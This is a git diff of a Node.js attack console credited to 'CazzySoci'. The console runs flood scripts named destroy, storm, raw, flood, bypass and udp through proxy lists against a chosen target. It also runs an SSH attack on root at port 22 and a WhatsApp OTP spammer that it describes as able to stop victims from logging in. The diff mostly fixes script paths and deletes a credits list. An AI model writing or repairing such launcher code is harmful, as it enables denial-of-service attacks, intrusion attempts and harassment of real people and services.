@@ -293,9 +293,13 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
           sigma()
           } else if (methods === 'slim') {
        pushOngoing(target, methods, duration)
-const destroy = path.join(__dirname, `/lib/cache/destroy`);
-const storm = path.join(__dirname, `/lib/cache/storm`);
-const rape = path.join(__dirname, `/lib/cache/rape`);
+const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
+const storm = path.join(__dirname, `/lib/cache/storm.js`);
+const rape = path.join(__dirname, `/lib/cache/rape.js`);
+const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
+const thunder = path.join(__dirname, `/lib/cache/rape.js`);
+const slim = path.join(__dirname, `/lib/cache/slim.js`);
+const raw = path.join(__dirname, `/lib/cache/raw.js`);
         exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
         exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
         exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
@@ -338,7 +342,7 @@ AS       : ${result.as}
   console.log(`Oops Something Went Wrong`)
 }
 
-const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
+const metode = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
 exec(`node ${metode} ${target} 22 root ${duration}`)
 sigma()
 };
@@ -371,7 +375,7 @@ Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
   console.log(`Oops Something Went Wrong`)
 }
 
-const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
+const metode = path.join(__dirname, `/lib/cache/StarsXTemp.js`);
 exec(`node ${metode} +${target} ${duration}`)
 sigma()
 };
@@ -402,9 +406,9 @@ Creator  : CazzySoci`)
 } catch (error) {
   console.log(`Oops Something Went Wrong`)
 }
-const raw = path.join(__dirname, `/lib/cache/raw`);
-const flood = path.join(__dirname, `/lib/cache/flood`);
-const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
+const raw = path.join(__dirname, `/lib/cache/raw.js`);
+const flood = path.join(__dirname, `/lib/cache/flood.js`);
+const ssh = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
 exec(`node ${ssh} ${target} 22 root ${duration}`)
 exec(`node ${flood} https://${target} ${duration}`)
 exec(`node ${raw} http://${target} ${duration}`)
@@ -438,7 +442,7 @@ Creator  : CazzySoci`)
   console.log(`Oops Something Went Wrong`)
 }
 
-const metode = path.join(__dirname, `/lib/cache/udp`);
+const metode = path.join(__dirname, `/lib/cache/udp.js`);
 exec(`node ${metode} ${target} ${port} ${duration}`)
 sigma()
 };
@@ -565,15 +569,6 @@ const latestNews = await getNews.text();
 const creatorCredits = `
 Created And Coded Full By CazzySoci
 
-Thx To:
-ChatGPT ( Fixing Error )
-IrfanNotSepuh ( Gatau Ngapain )
-Member And User ( Ga Buat Yang Dapet Gratis )
-My Family
-PLN Dan Wifi
-Github
-YouTube ( Music )
-Allah SWT
 `
 permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
   const [command, ...args] = input.trim().split(/\s+/);
